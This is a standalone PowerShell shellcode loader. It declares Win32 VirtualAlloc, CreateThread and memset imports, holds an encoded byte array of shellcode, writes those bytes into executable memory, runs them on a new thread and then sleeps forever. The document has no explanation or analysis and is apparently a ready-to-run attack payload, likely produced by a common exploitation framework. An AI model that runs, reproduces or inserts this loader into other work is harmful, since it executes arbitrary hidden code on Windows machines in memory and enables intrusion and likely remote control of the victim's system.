
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcc,0xd9,0x74,0x24,0xf4,0xbb,0x47,0xfe,0xc4,0x44,0x5f,0x31,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x5f,0x14,0x03,0x5f,0x53,0x1c,0x31,0xb8,0xb3,0x62,0xba,0x41,0x43,0x03,0x32,0xa4,0x72,0x03,0x20,0xac,0x24,0xb3,0x22,0xe0,0xc8,0x38,0x66,0x11,0x5b,0x4c,0xaf,0x16,0xec,0xfb,0x89,0x19,0xed,0x50,0xe9,0x38,0x6d,0xab,0x3e,0x9b,0x4c,0x64,0x33,0xda,0x89,0x99,0xbe,0x8e,0x42,0xd5,0x6d,0x3f,0xe7,0xa3,0xad,0xb4,0xbb,0x22,0xb6,0x29,0x0b,0x44,0x97,0xff,0x00,0x1f,0x37,0x01,0xc5,0x2b,0x7e,0x19,0x0a,0x11,0xc8,0x92,0xf8,0xed,0xcb,0x72,0x31,0x0d,0x67,0xbb,0xfe,0xfc,0x79,0xfb,0x38,0x1f,0x0c,0xf5,0x3b,0xa2,0x17,0xc2,0x46,0x78,0x9d,0xd1,0xe0,0x0b,0x05,0x3e,0x11,0xdf,0xd0,0xb5,0x1d,0x94,0x97,0x92,0x01,0x2b,0x7b,0xa9,0x3d,0xa0,0x7a,0x7e,0xb4,0xf2,0x58,0x5a,0x9d,0xa1,0xc1,0xfb,0x7b,0x07,0xfd,0x1c,0x24,0xf8,0x5b,0x56,0xc8,0xed,0xd1,0x35,0x84,0xc2,0xdb,0xc5,0x54,0x4d,0x6b,0xb5,0x66,0xd2,0xc7,0x51,0xca,0x9b,0xc1,0xa6,0x2d,0xb6,0xb6,0x39,0xd0,0x39,0xc7,0x10,0x16,0x6d,0x97,0x0a,0xbf,0x0e,0x7c,0xcb,0x40,0xdb,0xd3,0x9b,0xee,0xb4,0x93,0x4b,0x4e,0x65,0x7c,0x86,0x41,0x5a,0x9c,0xa9,0x88,0xf3,0x37,0x53,0x5a,0x35,0x37,0xaf,0x67,0xad,0xba,0x50,0x86,0x72,0x32,0xb6,0xc2,0x9a,0x12,0x60,0x7a,0x02,0x3f,0xfa,0x1b,0xcb,0x95,0x86,0x1b,0x47,0x1a,0x76,0xd5,0xa0,0x57,0x64,0x81,0x40,0x22,0xd6,0x07,0x5e,0x98,0x7d,0xa7,0xca,0x27,0xd4,0xf0,0x62,0x2a,0x01,0x36,0x2d,0xd5,0x64,0x4d,0xe4,0x43,0xc7,0x39,0x09,0x84,0xc7,0xb9,0x5f,0xce,0xc7,0xd1,0x07,0xaa,0x9b,0xc4,0x47,0x67,0x88,0x55,0xd2,0x88,0xf9,0x0a,0x75,0xe1,0x07,0x75,0xb1,0xae,0xf8,0x50,0x43,0x92,0x2e,0x9c,0x31,0xfa,0xf2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

